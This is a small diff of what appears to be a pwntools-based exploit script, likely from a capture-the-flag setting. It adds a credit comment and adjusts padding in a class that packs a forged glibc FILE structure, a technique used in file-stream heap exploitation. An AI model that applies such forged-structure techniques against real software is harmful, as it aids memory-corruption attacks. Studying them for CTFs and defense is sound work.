@@ -1,5 +1,9 @@
 #!/usr/bin/python3
 
+"""
+Credit: @kam1tsur3
+"""
+
 import sys
 import os
 from pwn import *
@@ -34,7 +38,9 @@ class FilePlusStruct:
 		s += p64(0)*4
 		s += p64(self._chain)
 		s += p64(self._fileno)
-		s += p64(0)*2
+		#s += p64(0xffffffffffffffff)
+		s += p64(0)
+		s += p64(0)
 		s += p64(self._lock)
 		s += p64(0xffffffffffffffff)
 		s += p64(0)*5
